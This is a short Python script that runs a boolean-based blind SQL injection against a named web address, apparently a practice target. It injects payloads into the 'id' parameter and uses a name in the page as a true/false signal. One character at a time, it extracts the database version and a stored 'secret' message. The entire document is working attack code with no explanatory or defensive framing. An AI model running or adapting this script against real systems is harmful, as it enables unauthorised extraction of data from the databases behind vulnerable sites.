import requests
import string
import time

TARGET = "https://elecos432.org/sqlinject3/"
CHARS = string.ascii_lowercase + string.digits + "._-"

def query_true(payload):
    url = TARGET + f"?id=1' AND {payload} AND '1'='1"
    for attempt in range(3):
        try:
            r = requests.get(url, timeout=10)
            return "David" in r.text
        except Exception:
            time.sleep(2)
    return False

def extract_string(sql_expr, max_length=50):
    result = ""
    for i in range(1, max_length + 1):
        found = False
        for c in CHARS:
            payload = f"substring(({sql_expr}),{i},1)='{c}'"
            if query_true(payload):
                result += c
                print(f"  Position {i}: '{c}' -> so far: {result}")
                found = True
                time.sleep(0.3)  # be gentle with the server
                break
        if not found:
            break
    return result

print("Extracting full version...")
version = extract_string("SELECT version()")
print(f"Version: {version}")

print("Extracting secret...")
secret = extract_string("SELECT message FROM foo LIMIT 0,1")
print(f"Secret: {secret}")